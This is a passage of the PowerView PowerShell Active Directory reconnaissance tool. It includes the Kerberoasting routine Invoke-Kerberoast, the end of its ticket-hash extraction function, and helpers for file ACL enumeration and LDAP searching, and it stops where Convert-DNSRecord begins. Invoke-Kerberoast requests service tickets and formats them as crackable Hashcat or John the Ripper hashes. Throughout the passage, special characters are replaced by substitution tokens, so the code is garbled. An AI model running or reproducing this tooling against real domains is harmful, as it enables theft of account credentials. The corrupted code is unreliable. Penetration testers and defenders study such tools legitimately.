                    RaUEtype = [Convert]::ToByte( RaUMatches.EtypeLen, 16 )
                    RaUCipherTextLen = [Convert]::ToUInt32(RaUMatches.CipherTextLen, 16)-4
                    RaUCipherText = RaUMatches.DataToEnd.Substring(0,RaUCipherTextLen*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if(RaUMatches.DataToEnd.Substring(RaUCipherTextLen*2, 4) -ne q4gUA482q4gU) {
                        Write-Warning Oj8XError parsing ciphertext for the SPN  RaU(RaUTicket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReqOj8X
                        RaUHash = RaUnull
                        RaUOut wZ5t Add-Member Noteproperty q4gUTicketByteHexStreamq4gU ([Bitconverter]::ToString(RaUTicketByteStream).Replace(q4gU-q4gU,q4gUq4gU))
                    } else {
                        RaUHash = Oj8XRaU(RaUCipherText.Substring(0,32))yJj0RaURaU(RaUCipherText.Substring(32))Oj8X
                        RaUOut wZ5t Add-Member Noteproperty q4gUTicketByteHexStreamq4gU RaUnull
                    }
                } else {
                    Write-Warning Oj8XUnable to parse ticket structure for the SPN  RaU(RaUTicket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReqOj8X
                    RaUHash = RaUnull
                    RaUOut wZ5t Add-Member Noteproperty q4gUTicketByteHexStreamq4gU ([Bitconverter]::ToString(RaUTicketByteStream).Replace(q4gU-q4gU,q4gUq4gU))
                }

                if(RaUHash) {
                    # JTR jumbo output format - RaUkrb5tgsRaUSPN/machine.testlab.local:63386d22d359fe...
                    if (RaUOutputFormat -match q4gUJohnq4gU) {
                        RaUHashFormat = Oj8XyJj0RaUkrb5tgsyJj0RaURaU(RaUTicket.ServicePrincipalName):RaUHashOj8X
                    }
                    else {
                        if (RaUDistinguishedName -ne q4gUUNKNOWNq4gU) {
                            RaUUserDomain = RaUDistinguishedName.SubString(RaUDistinguishedName.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        }
                        else {
                            RaUUserDomain = q4gUUNKNOWNq4gU
                        }

                        # hashcat output format - RaUkrb5tgsRaU23RaU*userRaUrealmRaUtest/spn*RaU63386d22d359fe...
                        RaUHashFormat = Oj8XyJj0RaUkrb5tgsyJj0RaURaU(RaUEtype)yJj0RaU*RaUSamAccountNameyJj0RaURaUUserDomainyJj0RaURaU(RaUTicket.ServicePrincipalName)*yJj0RaURaUHashOj8X
                    }
                    RaUOut wZ5t Add-Member Noteproperty q4gUHashq4gU RaUHashFormat
                }

                RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.SPNTicketq4gU)
                RaUOut
            }
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Invoke-Kerberoast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  

.DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER OutputFormat

Either q4gUJohnq4gU for John the Ripper style hash formatting, or q4gUHashcatq4gU for Hashcat format.
Defaults to q4gUHashcatq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Invoke-Kerberoast wZ5t fl

Kerberoasts all found SPNs for the current domain, outputting to Hashcat format (default).

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local wZ5t fl

Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
format instead of Hashcat.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -orce
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLBScKjdfm.aq4gU, RaUSecPassword)
Invoke-Kerberoast -Credential RaUCred -Verbose -Domain testlab.local wZ5t fl

Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.SPNTicketq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [ValidateSet(q4gUJohnq4gU, q4gUHashcatq4gU)]
        [Alias(q4gUFormatq4gU)]
        [String]
        RaUOutputFormat = q4gUHashcatq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUUserSearcherArguments = @{
            q4gUSPNq4gU = RaUTrue
            q4gUPropertiesq4gU = q4gUsamaccountname,distinguishedname,serviceprincipalnameq4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUUserSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUUserSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUUserSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUUserSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUUserSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUUserSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUUserSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUUserSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUUserSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }
        Get-DomainUser @UserSearcherArguments wZ5t Where-Object {RaU_.samaccountname -ne q4gUkrbtgtq4gU} wZ5t Get-DomainSPNTicket -OutputFormat RaUOutputFormat
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-PathAcl {
<#
.SYNOPSIS

Enumerates the ACL for a given file path.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  

.DESCRIPTION

Enumerates the ACL for a specified file/folder path, and translates
the access rules for each entry into readable formats. If -Credential is passed,
Add-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.

.PARAMETER Path

Specifies the local or remote path to enumerate the ACLs for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target path.

.EXAMPLE

Get-PathAcl Oj8XScKjScKjSERVERScKjShareScKjOj8X

Returns ACLs for the given UNC share.

.EXAMPLE

gci .ScKjtest.txt wZ5t Get-PathAcl

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfmq4gU, RaUSecPassword)
Get-PathAcl -Path Oj8XScKjScKjSERVERScKjShareScKjOj8X -Credential RaUCred

.INPUTS

String

One of more paths to enumerate ACLs for.

.OUTPUTS

PowerView.FileACL

A custom object with the full path and associated ACL entries.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.FileACLq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUFullNameq4gU)]
        [String[]]
        RaUPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            [CmdletBinding()]
            Param(
                [Int]
                RaUFSR
            )

            RaUAccessMask = @{
                [uint32]q4gU0x80000000q4gU = q4gUGenericReadq4gU
                [uint32]q4gU0x40000000q4gU = q4gUGenericWriteq4gU
                [uint32]q4gU0x20000000q4gU = q4gUGenericExecuteq4gU
                [uint32]q4gU0x10000000q4gU = q4gUGenericAllq4gU
                [uint32]q4gU0x02000000q4gU = q4gUMaximumAllowedq4gU
                [uint32]q4gU0x01000000q4gU = q4gUAccessSystemSecurityq4gU
                [uint32]q4gU0x00100000q4gU = q4gUSynchronizeq4gU
                [uint32]q4gU0x00080000q4gU = q4gUWriteOwnerq4gU
                [uint32]q4gU0x00040000q4gU = q4gUWriteDACq4gU
                [uint32]q4gU0x00020000q4gU = q4gUReadControlq4gU
                [uint32]q4gU0x00010000q4gU = q4gUDeleteq4gU
                [uint32]q4gU0x00000100q4gU = q4gUWriteAttributesq4gU
                [uint32]q4gU0x00000080q4gU = q4gUReadAttributesq4gU
                [uint32]q4gU0x00000040q4gU = q4gUDeleteChildq4gU
                [uint32]q4gU0x00000020q4gU = q4gUExecute/Traverseq4gU
                [uint32]q4gU0x00000010q4gU = q4gUWriteExtendedAttributesq4gU
                [uint32]q4gU0x00000008q4gU = q4gUReadExtendedAttributesq4gU
                [uint32]q4gU0x00000004q4gU = q4gUAppendData/AddSubdirectoryq4gU
                [uint32]q4gU0x00000002q4gU = q4gUWriteData/AddFileq4gU
                [uint32]q4gU0x00000001q4gU = q4gUReadData/ListDirectoryq4gU
            }

            RaUSimplePermissions = @{
                [uint32]q4gU0x1f01ffq4gU = q4gUFullControlq4gU
                [uint32]q4gU0x0301bfq4gU = q4gUModifyq4gU
                [uint32]q4gU0x0200a9q4gU = q4gUReadAndExecuteq4gU
                [uint32]q4gU0x02019fq4gU = q4gUReadAndWriteq4gU
                [uint32]q4gU0x020089q4gU = q4gUReadq4gU
                [uint32]q4gU0x000116q4gU = q4gUWriteq4gU
            }

            RaUPermissions = @()

            # get simple permission
            RaUPermissions += RaUSimplePermissions.Keys wZ5t ForEach-Object {
                              if ((RaUFSR -band RaU_) -eq RaU_) {
                                RaUSimplePermissions[RaU_]
                                RaUFSR = RaUFSR -band (-not RaU_)
                              }
                            }

            # get remaining extended permissions
            RaUPermissions += RaUAccessMask.Keys wZ5t Where-Object { RaUFSR -band RaU_ } wZ5t ForEach-Object { RaUAccessMask[RaU_] }
            (RaUPermissions wZ5t Where-Object {RaU_}) -join q4gU,q4gU
        }

        RaUConvertArguments = @{}
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUConvertArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUMappedComputers = @{}
    }

    PROCESS {
        ForEach (RaUTargetPath in RaUPath) {
            try {
                if ((RaUTargetPath -Match q4gUScKjScKjScKjScKj.*ScKjScKj.*q4gU) -and (RaUPSBoundParameters[q4gUCredentialq4gU])) {
                    RaUHostComputer = (New-Object System.Uri(RaUTargetPath)).Host
                    if (-not RaUMappedComputers[RaUHostComputer]) {
                        # map IPCRaU to this computer if itq4gUs not already
                        Add-RemoteConnection -ComputerName RaUHostComputer -Credential RaUCredential
                        RaUMappedComputers[RaUHostComputer] = RaUTrue
                    }
                }

                RaUACL = Get-Acl -Path RaUTargetPath

                RaUACL.GetAccessRules(RaUTrue, RaUTrue, [System.Security.Principal.SecurityIdentifier]) wZ5t ForEach-Object {
                    RaUSID = RaU_.IdentityReference.Value
                    RaUName = ConvertFrom-SID -ObjectSID RaUSID @ConvertArguments

                    RaUOut = New-Object PSObject
                    RaUOut wZ5t Add-Member Noteproperty q4gUPathq4gU RaUTargetPath
                    RaUOut wZ5t Add-Member Noteproperty q4gUFileSystemRightsq4gU (Convert-FileRight -FSR RaU_.FileSystemRights.value__)
                    RaUOut wZ5t Add-Member Noteproperty q4gUIdentityReferenceq4gU RaUName
                    RaUOut wZ5t Add-Member Noteproperty q4gUIdentitySIDq4gU RaUSID
                    RaUOut wZ5t Add-Member Noteproperty q4gUAccessControlTypeq4gU RaU_.AccessControlType
                    RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.FileACLq4gU)
                    RaUOut
                }
            }
            catch {
                Write-Verbose Oj8X[Get-PathAcl] error: RaU_Oj8X
            }
        }
    }

    END {
        # remove the IPCRaU mappings
        RaUMappedComputers.Keys wZ5t Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Domain* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.Management.Automation.PSCustomObjectq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        RaUProperties
    )

    RaUObjectProperties = @{}

    RaUProperties.PropertyNames wZ5t ForEach-Object {
        if (RaU_ -ne q4gUadspathq4gU) {
            if ((RaU_ -eq q4gUobjectsidq4gU) -or (RaU_ -eq q4gUsidhistoryq4gU)) {
                # convert all listed sids (i.e. if multiple are listed in sidHistory)
                RaUObjectProperties[RaU_] = RaUProperties[RaU_] wZ5t ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier(RaU_, 0)).Value }
            }
            elseif (RaU_ -eq q4gUgrouptypeq4gU) {
                RaUObjectProperties[RaU_] = RaUProperties[RaU_][0] -as RaUGroupTypeEnum
            }
            elseif (RaU_ -eq q4gUsamaccounttypeq4gU) {
                RaUObjectProperties[RaU_] = RaUProperties[RaU_][0] -as RaUSamAccountTypeEnum
            }
            elseif (RaU_ -eq q4gUobjectguidq4gU) {
                # convert the GUID to a string
                RaUObjectProperties[RaU_] = (New-Object Guid (,RaUProperties[RaU_][0])).Guid
            }
            elseif (RaU_ -eq q4gUuseraccountcontrolq4gU) {
                RaUObjectProperties[RaU_] = RaUProperties[RaU_][0] -as RaUUACEnum
            }
            elseif (RaU_ -eq q4gUntsecuritydescriptorq4gU) {
                # RaUObjectProperties[RaU_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList RaUProperties[RaU_][0], 0
                RaUDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList RaUProperties[RaU_][0], 0
                if (RaUDescriptor.Owner) {
                    RaUObjectProperties[q4gUOwnerq4gU] = RaUDescriptor.Owner
                }
                if (RaUDescriptor.Group) {
                    RaUObjectProperties[q4gUGroupq4gU] = RaUDescriptor.Group
                }
                if (RaUDescriptor.DiscretionaryAcl) {
                    RaUObjectProperties[q4gUDiscretionaryAclq4gU] = RaUDescriptor.DiscretionaryAcl
                }
                if (RaUDescriptor.SystemAcl) {
                    RaUObjectProperties[q4gUSystemAclq4gU] = RaUDescriptor.SystemAcl
                }
            }
            elseif (RaU_ -eq q4gUaccountexpiresq4gU) {
                if (RaUProperties[RaU_][0] -gt [DateTime]::MaxValue.Ticks) {
                    RaUObjectProperties[RaU_] = Oj8XNEVEROj8X
                }
                else {
                    RaUObjectProperties[RaU_] = [datetime]::fromfiletime(RaUProperties[RaU_][0])
                }
            }
            elseif ( (RaU_ -eq q4gUlastlogonq4gU) -or (RaU_ -eq q4gUlastlogontimestampq4gU) -or (RaU_ -eq q4gUpwdlastsetq4gU) -or (RaU_ -eq q4gUlastlogoffq4gU) -or (RaU_ -eq q4gUbadPasswordTimeq4gU) ) {
                # convert timestamps
                if (RaUProperties[RaU_][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    RaUTemp = RaUProperties[RaU_][0]
                    [Int32]RaUHigh = RaUTemp.GetType().InvokeMember(q4gUHighPartq4gU, [System.Reflection.BindingFlags]::GetProperty, RaUNull, RaUTemp, RaUNull)
                    [Int32]RaULow  = RaUTemp.GetType().InvokeMember(q4gULowPartq4gU,  [System.Reflection.BindingFlags]::GetProperty, RaUNull, RaUTemp, RaUNull)
                    RaUObjectProperties[RaU_] = ([datetime]::FromFileTime([Int64](Oj8X0x{0:x8}{1:x8}Oj8X -f RaUHigh, RaULow)))
                }
                else {
                    # otherwise just a string
                    RaUObjectProperties[RaU_] = ([datetime]::FromFileTime((RaUProperties[RaU_][0])))
                }
            }
            elseif (RaUProperties[RaU_][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                RaUProp = RaUProperties[RaU_]
                try {
                    RaUTemp = RaUProp[RaU_][0]
                    [Int32]RaUHigh = RaUTemp.GetType().InvokeMember(q4gUHighPartq4gU, [System.Reflection.BindingFlags]::GetProperty, RaUNull, RaUTemp, RaUNull)
                    [Int32]RaULow  = RaUTemp.GetType().InvokeMember(q4gULowPartq4gU,  [System.Reflection.BindingFlags]::GetProperty, RaUNull, RaUTemp, RaUNull)
                    RaUObjectProperties[RaU_] = [Int64](Oj8X0x{0:x8}{1:x8}Oj8X -f RaUHigh, RaULow)
                }
                catch {
                    Write-Verbose Oj8X[Convert-LDAPProperty] error: RaU_Oj8X
                    RaUObjectProperties[RaU_] = RaUProp[RaU_]
                }
            }
            elseif (RaUProperties[RaU_].count -eq 1) {
                RaUObjectProperties[RaU_] = RaUProperties[RaU_][0]
            }
            else {
                RaUObjectProperties[RaU_] = RaUProperties[RaU_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property RaUObjectProperties
    }
    catch {
        Write-Warning Oj8X[Convert-LDAPProperty] Error parsing LDAP properties : RaU_Oj8X
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. Oj8XCN=Sites,CN=ConfigurationOj8X).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter q4gU(samAccountType=805306368)q4gU -Properties q4gUSamAccountName,lastlogonq4gU

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.DirectoryServices.DirectorySearcherq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUSearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit = 120,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUTargetDomain = RaUDomain

            if (RaUENV:USERDNSDOMAIN -and (RaUENV:USERDNSDOMAIN.Trim() -ne q4gUq4gU)) {
                # see if we can grab the user DNS logon domain from environment variables
                RaUUserDomain = RaUENV:USERDNSDOMAIN
                if (RaUENV:LOGONSERVER -and (RaUENV:LOGONSERVER.Trim() -ne q4gUq4gU) -and RaUUserDomain) {
                    RaUBindServer = Oj8XRaU(RaUENV:LOGONSERVER -replace q4gUScKjScKjq4gU,q4gUq4gU).RaUUserDomainOj8X
                }
            }
        }
        elseif (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
            RaUDomainObject = Get-Domain -Credential RaUCredential
            RaUBindServer = (RaUDomainObject.PdcRoleOwner).Name
            RaUTargetDomain = RaUDomainObject.Name
        }
        elseif (RaUENV:USERDNSDOMAIN -and (RaUENV:USERDNSDOMAIN.Trim() -ne q4gUq4gU)) {
            # see if we can grab the user DNS logon domain from environment variables
            RaUTargetDomain = RaUENV:USERDNSDOMAIN
            if (RaUENV:LOGONSERVER -and (RaUENV:LOGONSERVER.Trim() -ne q4gUq4gU) -and RaUTargetDomain) {
                RaUBindServer = Oj8XRaU(RaUENV:LOGONSERVER -replace q4gUScKjScKjq4gU,q4gUq4gU).RaUTargetDomainOj8X
            }
        }
        else {
            # otherwise, resort to Get-Domain to retrieve the current domain object
            write-verbose Oj8Xget-domainOj8X
            RaUDomainObject = Get-Domain
            RaUBindServer = (RaUDomainObject.PdcRoleOwner).Name
            RaUTargetDomain = RaUDomainObject.Name
        }

        if (RaUPSBoundParameters[q4gUServerq4gU]) {
            # if thereq4gUs not a specified server to bind to, try to pull a logon server from ENV variables
            RaUBindServer = RaUServer
        }

        RaUSearchString = q4gULDAP://q4gU

        if (RaUBindServer -and (RaUBindServer.Trim() -ne q4gUq4gU)) {
            RaUSearchString += RaUBindServer
            if (RaUTargetDomain) {
                RaUSearchString += q4gU/q4gU
            }
        }

        if (RaUPSBoundParameters[q4gUSearchBasePrefixq4gU]) {
            RaUSearchString += RaUSearchBasePrefix + q4gU,q4gU
        }

        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) {
            if (RaUSearchBase -Match q4gU^GC://q4gU) {
                # if weq4gUre searching the global catalog, get the path in the right format
                RaUDN = RaUSearchBase.ToUpper().Trim(q4gU/q4gU)
                RaUSearchString = q4gUq4gU
            }
            else {
                if (RaUSearchBase -match q4gU^LDAP://q4gU) {
                    if (RaUSearchBase -match Oj8XLDAP://.+/.+Oj8X) {
                        RaUSearchString = q4gUq4gU
                        RaUDN = RaUSearchBase
                    }
                    else {
                        RaUDN = RaUSearchBase.SubString(7)
                    }
                }
                else {
                    RaUDN = RaUSearchBase
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if (RaUTargetDomain -and (RaUTargetDomain.Trim() -ne q4gUq4gU)) {
                RaUDN = Oj8XDC=RaU(RaUTargetDomain.Replace(q4gU.q4gU, q4gU,DC=q4gU))Oj8X
            }
        }

        RaUSearchString += RaUDN
        Write-Verbose Oj8X[Get-DomainSearcher] search base: RaUSearchStringOj8X

        if (RaUCredential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose Oj8X[Get-DomainSearcher] Using alternate credentials for LDAP connectionOj8X
            # bind to the inital search object using alternate credentials
            RaUDomainObject = New-Object DirectoryServices.DirectoryEntry(RaUSearchString, RaUCredential.UserName, RaUCredential.GetNetworkCredential().Password)
            RaUSearcher = New-Object System.DirectoryServices.DirectorySearcher(RaUDomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            RaUSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]RaUSearchString)
        }

        RaUSearcher.PageSize = RaUResultPageSize
        RaUSearcher.SearchScope = RaUSearchScope
        RaUSearcher.CacheResults = RaUFalse
        RaUSearcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) {
            RaUSearcher.ServerTimeLimit = RaUServerTimeLimit
        }

        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) {
            RaUSearcher.Tombstone = RaUTrue
        }

        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
            RaUSearcher.filter = RaULDAPFilter
        }

        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) {
            RaUSearcher.SecurityMasks = Switch (RaUSecurityMasks) {
                q4gUDaclq4gU { [System.DirectoryServices.SecurityMasks]::Dacl }
                q4gUGroupq4gU { [System.DirectoryServices.SecurityMasks]::Group }
                q4gUNoneq4gU { [System.DirectoryServices.SecurityMasks]::None }
                q4gUOwnerq4gU { [System.DirectoryServices.SecurityMasks]::Owner }
                q4gUSaclq4gU { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            RaUPropertiesToLoad = RaUPropertieswZ5t ForEach-Object { RaU_.Split(q4gU,q4gU) }
            RaUNull = RaUSearcher.PropertiesToLoad.AddRange((RaUPropertiesToLoad))
        }

        RaUSearcher
    }
}


function Convert-DNSRecord {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

